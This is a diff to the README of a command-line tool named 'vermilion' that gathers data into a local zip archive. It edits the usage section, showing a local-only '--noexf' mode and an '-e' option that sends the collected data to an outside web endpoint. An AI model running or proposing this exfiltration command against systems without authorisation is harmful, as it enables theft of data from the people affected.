@@ -18,11 +18,8 @@ In order to see the tool helper run:
 vermilion -h
 ```  
 
-By default no exfiltration is executed, the following two commands are the same:
-```console
-vermilion
-```
-and
+To run the tool with no exfiltration run:  
+
 ```console
 vermilion --noexf
 ```  
@@ -31,7 +28,7 @@ both the previous command produce a local `exdata` folder with a compressed (.zi
 The archive contains all exfiltrated data.  
 
 
-If you want to specify and endpoint for exfiltration run:  
+If you want to specify an endpoint for exfiltration run:  
 ```console
 vermilion -e https://<your-web-endpoint>
 ```  
